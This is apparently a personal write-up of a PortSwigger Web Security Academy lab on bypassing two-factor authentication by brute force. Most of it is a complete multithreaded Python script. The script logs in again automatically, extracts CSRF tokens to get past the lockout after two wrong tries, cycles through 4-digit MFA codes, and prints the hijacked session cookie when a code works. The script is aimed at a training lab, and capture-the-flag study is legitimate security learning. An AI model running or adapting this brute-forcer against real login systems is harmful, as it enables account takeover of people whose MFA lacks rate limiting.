# EXPERT: 2FA bypass using a brute-force attack

![Снимок экрана 2025-12-02 в 14.22.36.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_14.22.36.png)

After logging using creds

![Снимок экрана 2025-12-02 в 14.22.56.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_14.22.56.png)

![Снимок экрана 2025-12-02 в 14.23.25.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_14.23.25.png)

![Снимок экрана 2025-12-02 в 14.23.36.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_14.23.36.png)

![Снимок экрана 2025-12-02 в 14.24.35.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_14.24.35.png)

We are logged out after 2 tries to guess MFA code. However, we still can try to perform bruteforce attack using a python script that will re-logon and fetch a CSRF token automatically.

```python
import requests
import sys
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import http.client
import socket

# Disable warnings for cleaner output
import warnings

warnings.filterwarnings('ignore')

class UltraFastMFABruteforcer:
    def __init__(self, host, username="carlos", password="montoya", max_workers=20):
        self.host = host
        self.username = username
        self.password = password
        self.base_url = f"https://{host}"
        self.max_workers = max_workers
        self.attempts = 0
        self.success = False
        self.found_code = None
        self.lock = threading.Lock()
        self.session_pool = Queue()
        self.codes_queue = Queue()
        self.session_counter = 0  # Track session usage

        # Prepare connection pools
        self._init_session_pool(10)

    def _init_session_pool(self, count):
        """Pre-create sessions for reuse"""
        for _ in range(count):
            session = requests.Session()
            # Optimize session for speed
            session.keep_alive = True
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            })
            # Increase connection pool size
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=20,
                pool_maxsize=100,
                max_retries=2,
                pool_block=False
            )
            session.mount('https://', adapter)
            session.mount('http://', adapter)
            self.session_pool.put(session)

    def get_session(self):
        """Get a session from pool or create new one"""
        try:
            session = self.session_pool.get_nowait()
        except:
            # Create new session if pool is empty
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=100)
            session.mount('https://', adapter)
            session.mount('http://', adapter)

        # Assign a unique ID to track this session
        if not hasattr(session, 'session_id'):
            with self.lock:
                self.session_counter += 1
                session.session_id = f"SESS-{self.session_counter:03d}"
        return session

    def return_session(self, session):
        """Return session to pool"""
        self.session_pool.put(session)

    def extract_csrf(self, text):
        """Fast CSRF extraction using regex"""
        match = re.search(r'csrf["\']?\s*value=["\']?([^"\'\s>]+)', text, re.I)
        return match.group(1) if match else None

    def perform_full_attempt(self, session, code):
        """Complete attempt in one function to minimize overhead - now takes session as parameter"""
        if self.success:
            return False

        try:
            login_url = f"{self.base_url}/login"

            # GET login page
            resp1 = session.get(login_url, timeout=3)
            csrf1 = self.extract_csrf(resp1.text)
            if not csrf1:
                return False

            # Step 2: POST login
            login_data = f"csrf={csrf1}&username={self.username}&password={self.password}"
            resp2 = session.post(login_url,
                                 data=login_data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=3,
                                 allow_redirects=False)

            # Step 3: GET MFA page
            mfa_url = f"{self.base_url}/login2"
            resp3 = session.get(mfa_url, timeout=3)
            csrf2 = self.extract_csrf(resp3.text)
            if not csrf2:
                return False

            # Step 4: POST MFA code
            mfa_data = f"csrf={csrf2}&mfa-code={str(code).zfill(4)}"
            resp4 = session.post(mfa_url,
                                 data=mfa_data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=3,
                                 allow_redirects=False)

            # Check for success
            with self.lock:
                self.attempts += 1

                # Success condition: 302 redirect not to login2
                if resp4.status_code == 302 and 'login2' not in resp4.headers.get('Location', ''):
                    self.success = True
                    self.found_code = code
                    return True

            return False

        except Exception as e:
            # Silent fail for speed
            return False

    def worker(self):
        """Worker thread for processing codes - displays session with each MFA attempt"""
        thread_id = threading.current_thread().name
        local_attempts = 0

        while not self.success and not self.codes_queue.empty():
            try:
                code = self.codes_queue.get_nowait()
                local_attempts += 1

                # Get a session for this attempt
                session = self.get_session()

                # Display session association with MFA code
                formatted_code = str(code).zfill(4)
                print(f"[{thread_id}] Session {session.session_id} → Trying MFA: {formatted_code}")

                # Perform the attempt
                if self.perform_full_attempt(session, code):
                    # Success - show the winning combination
                    print(f"\n{'=' * 60}")
                    print(f"[!!!] SUCCESS! Session {session.session_id} found valid MFA: {formatted_code}")
                    print(f"{'=' * 60}")

                    # Get the final session cookie if available
                    session_cookie = session.cookies.get('session', 'N/A')
                    print(f"[+] Session Cookie: {session_cookie}")

                    # Don't return session to pool since we might want to keep it
                    break

                # Return session to pool for reuse
                self.return_session(session)

                # Optional: Brief pause to make output readable
                # time.sleep(0.01)

            except Exception as e:
                # Minimal error display
                print(f"[{thread_id}] Error processing code: {e}")
                continue

        # Clean up any remaining session
        try:
            if 'session' in locals():
                self.return_session(session)
        except:
            pass

    def brute_force_ultrafast(self, codes_file):
        """Ultra-fast parallel brute force"""
        # Load all codes
        with open(codes_file, 'r') as f:
            codes = [line.strip().zfill(4) for line in f if line.strip()]

        print(f"[+] Loaded {len(codes)} codes")
        print(f"[+] Starting {self.max_workers} concurrent workers")
        print(f"[+] Target: {self.host}")
        print(f"[+] Session tracking ENABLED - each attempt shows session ID")
        print()

        # Fill queue
        for code in codes:
            self.codes_queue.put(code)

        start_time = time.time()
        last_print = start_time
        last_attempts = 0

        # Start workers
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]

            # Monitor progress
            while not self.success and any(not f.done() for f in futures):
                time.sleep(0.5)  # Slightly longer sleep for cleaner output
                current_time = time.time()

                # Print progress every 2 seconds
                if current_time - last_print >= 2.0:
                    elapsed = current_time - start_time
                    attempts_since_last = self.attempts - last_attempts
                    rate_since_last = attempts_since_last / 2.0 if current_time - last_print >= 2.0 else 0
                    overall_rate = self.attempts / elapsed if elapsed > 0 else 0
                    remaining = (self.codes_queue.qsize()) / overall_rate if overall_rate > 0 else 0

                    print(f"\r{' ' * 80}", end="")  # Clear line
                    print(f"\r[STATS] Attempts: {self.attempts} | "
                          f"Rate: {overall_rate:.1f}/s (Recent: {rate_since_last:.1f}/s) | "
                          f"ETA: {remaining / 60:.1f}min | Queue: {self.codes_queue.qsize()}",
                          end="", flush=True)

                    last_print = current_time
                    last_attempts = self.attempts

        # Wait for all threads
        for future in futures:
            try:
                future.result(timeout=1)
            except:
                pass

        elapsed = time.time() - start_time

        if self.success:
            print(f"\n\n{'=' * 60}")
            print("[+] ATTACK SUCCESSFUL!")
            print(f"[+] Valid MFA code: {self.found_code}")
            print(f"[+] Total attempts: {self.attempts}")
            print(f"[+] Total time: {elapsed:.2f} seconds")
            print(f"[+] Average rate: {self.attempts / elapsed:.1f} attempts/second")
            print(f"[+] Total sessions used: {self.session_counter}")
            print(f"{'=' * 60}")
            return True
        else:
            print(f"\n\n[-] Attack failed after {self.attempts} attempts")
            print(f"[-] Time elapsed: {elapsed:.2f} seconds")
            print(f"[-] Sessions created: {self.session_counter}")
            return False

# EVEN FASTER VERSION using raw HTTP/2 (if supported)
class HTTP2MFABruteforcer:
    """Experimental: Use HTTP/2 for even faster requests"""

    def __init__(self, host):
        self.host = host
        # This would require h2 or hyper library
        # Implementation depends on HTTP/2 support

def optimize_system():
    """System optimizations for maximum speed"""
    import resource
    # Increase file descriptor limit
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
    except:
        pass

    # Configure socket for reuse
    socket.setdefaulttimeout(3)

def main():
    optimize_system()

    host = "0aed00a603b96a6084fcd1db00cd0023.web-security-academy.net"
    codes_file = "/tmp/0_1000"

    # Time estimate with optimized version
    print("\n" + "=" * 60)
    print("ULTRA-FAST MFA BRUTEFORCE ATTACK")
    print("=" * 60)

    print("\n[+] Performance Estimate (Optimized):")
    print("    • 10,000 possible codes")
    print("    • 20 concurrent workers")
    print("    • ~4 requests per code attempt")
    print("    • Estimated: 30-90 minutes")
    print("\n[!] WARNING: This will generate high traffic!")

    workers = 25

    print(f"\n[+] Starting attack with {workers} workers...")
    print("[+] Each attempt will show: [ThreadName] Session ID → Trying MFA: XXXX")
    print("[+] Press Ctrl+C to stop\n")
    time.sleep(2)

    bruteforcer = UltraFastMFABruteforcer(host, max_workers=workers)
    while True:
        try:
            success = bruteforcer.brute_force_ultrafast(codes_file)
            if success:
                exit()
        except KeyboardInterrupt:
            print(f"\n\n[!] Attack interrupted by user")
            print(f"[*] Total attempts made: {bruteforcer.attempts}")
            print(f"[*] Sessions used: {bruteforcer.session_counter}")
        except Exception as e:
            print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()
```

![Снимок экрана 2025-12-02 в 15.04.51.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.04.51.png)

![Снимок экрана 2025-12-02 в 15.05.01.png](EXPERT%202FA%20bypass%20using%20a%20brute-force%20attack/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.05.01.png)